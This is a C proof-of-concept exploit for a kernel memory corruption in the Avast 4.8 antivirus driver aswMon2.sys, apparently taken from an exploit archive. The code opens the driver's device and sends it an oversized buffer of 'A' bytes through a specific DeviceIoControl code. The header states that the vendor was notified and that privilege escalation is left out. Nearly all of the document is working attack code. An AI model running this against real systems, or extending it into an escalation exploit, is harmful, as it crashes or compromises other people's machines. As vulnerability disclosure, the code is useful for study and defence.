/ * Avast 4.8.1351.0 antivirus aswMon2.sys Kernel Memory Corruption<br>
 *<br>
 * Author: Giuseppe 'Evilcry' Bonfa'<br>
 * E-Mail: evilcry _AT_ gmail _DOT_ com<br>
 * Website: http://evilcry.netsons.org<br>
 *          http://evilcodecave.blogspot.com <br>
 *          http://evilfingers.com<br>
 *<br>
 * Vendor: Notified<br>
 *<br>
 * No L.P.E. for kiddies<br>
 * /<br><br>

#define WIN32_LEAN_AND_MEAN<br>
#include < windows.h><br>
#include < stdio.h><br><br>


BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice) //taken from esagelab<br>
{<br>
        WCHAR DeviceName[MAX_PATH];<br>
        HANDLE hDevice;<br>

        if ((GetVersion() & 0xFF) >= 5) <br>
        {<br>
                wcscpy(DeviceName, L"\\\\.\\Global\\");<br>
        } <br>
        else <br>
        {<br>
                wcscpy(DeviceName, L"\\\\.\\");<br>
        }<br><br>

        wcscat(DeviceName, DriverName);<br>

        printf("Opening.. %S\n", DeviceName);<br>

        hDevice = CreateFileW(DeviceName, GENERIC_READ | <br>
        GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);<br><br>

        if (hDevice == INVALID_HANDLE_VALUE)<br>
        {<br>
                printf("CreateFile() ERROR %d\n", GetLastError());<br>
                return FALSE;<br>
        }<br><br>

        *lphDevice = hDevice;<br>

       return TRUE;<br>
}<br><br>

int main()<br>
{<br>
        HANDLE hDev = NULL;<br>
        DWORD Junk;<br>

        if(!OpenDevice(L"aswMon",&hDev))<br>
        {<br>
                printf("Unable to access aswMon");<br>
                return(0);<br>
        }<br><br>

        char *Buff = (char *)VirtualAlloc(NULL, 0x288, MEM_RESERVE | <br>
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>

        if (Buff)<br>
        {<br>
                memset(Buff, 'A', 0x288);<br>
                DeviceIoControl(hDev,0xB2C80018,Buff,
                0x288,Buff,0x288,&Junk,(LPOVERLAPPED)NULL);<br>
                printf("DeviceIoControl Executed..\n"); <br>
        }    <br>
        else<br>
        {<br>
                printf("VirtualAlloc() ERROR %d\n", GetLastError());<br>
        }<br>


        return(0);<br>
}<br><br>


